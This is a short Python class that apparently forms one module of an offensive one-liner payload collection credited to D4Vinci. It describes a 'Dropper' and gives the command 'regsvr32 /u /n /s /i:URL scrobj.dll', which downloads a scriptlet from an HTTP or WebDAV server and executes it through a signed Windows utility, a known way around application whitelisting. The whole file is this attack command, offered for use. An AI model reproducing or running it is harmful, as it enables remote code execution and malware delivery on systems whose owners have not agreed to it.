class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Download and execute a scriptlet file from a http server or webdav server."
    function    = "Dropper"
    liner       = 'regsvr32 /u /n /s /i:URL scrobj.dll'
